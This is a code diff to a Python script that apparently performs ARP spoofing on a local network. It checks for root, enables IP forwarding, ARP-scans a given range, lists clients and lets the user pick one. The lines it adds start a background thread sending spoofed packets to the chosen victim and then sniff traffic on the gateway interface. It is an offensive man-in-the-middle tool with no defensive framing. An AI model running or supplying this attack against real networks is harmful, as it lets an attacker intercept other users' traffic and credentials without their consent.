@@ -108,12 +108,13 @@ def printArpRes(arpRes):
             except:
                 print("Invalid Choice")
 
+
 def getCmdArgs():
     ipRange = None
     if len(sys.argv) - 1 > 0 and sys.argv[1] != "ipRange":
         print("-ipRange flag not specified")
         return ipRange
-    elif len(sys.argv) -1 > 0 and sys.argv[1] == "-ipRange":
+    elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-ipRange":
         try:
             print(f"{IPv4Network(sys.argv[2])}")
             ipRange = sys.argv[2]
@@ -122,25 +123,31 @@ def getCmdArgs():
             print("Invalid CLI Argument detected")
     return ipRange
 
+
 sudoCheck()
 
 ipRange = getCmdArgs()
 if ipRange == None:
     print("No valid ip range Specified,")
     exit()
-    
+
 allowIpForwading()
 
 arpRes = arpScan(ipRange)
 if len(arpRes) == 0:
     print("Connection ckeck returned False, check your connection")
     exit()
-    
+
 gateways = gatewayInfo(arpRes)
 gatewayGetInfo = gateways[0]
 clientInfo = clients(arpRes, gateways)
 if len(clientInfo) == 0:
     print("No clients found")
     exit()
-    
+
 choice = printArpRes(clientInfo)
+nodeToSpoof = clientInfo[choice]
+t1 = threading.Thread(target=sendSpoofPackets, daemon=True)
+t1.start()
+os.chdir(cwd)
+packetSniffer(gatewayGetInfo["iface"])
